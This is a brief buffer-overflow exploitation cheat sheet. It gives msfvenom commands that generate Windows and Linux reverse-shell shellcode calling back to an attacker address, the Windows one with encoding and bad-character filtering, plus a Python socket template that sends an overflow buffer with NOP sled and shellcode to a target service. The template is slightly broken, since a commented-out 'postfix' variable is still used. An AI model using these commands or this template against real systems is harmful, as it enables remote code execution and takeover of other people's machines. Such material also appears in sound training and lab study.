### Shellcode
##### Windows
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=80 EXITFUNC=thread -f python -a x86 -b "\x00" -e x86/shikata_ga_nai
```

##### Linux
```bash
msfvenom -p linux/shell_reverse_tcp LHOST=10.10.10.10 LPORT=80 EXITFUNC=thread -f python -a x86 -b "\x00"
```

### Exploit
```python
import socket

ip = ""
port = 0

prefix = b""
offset = 0
overflow = b"A" * offset
retn = b""
padding = b"\x90" * 16
# postfix = "\r\n"

buffer = b""

payload = prefix + overflow + retn + padding + buffer + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	s.recv(1024)
	print("Sending evil buffer...")
	s.send(payload)
	print("Done!")
except:
    print("Could not connect.")
```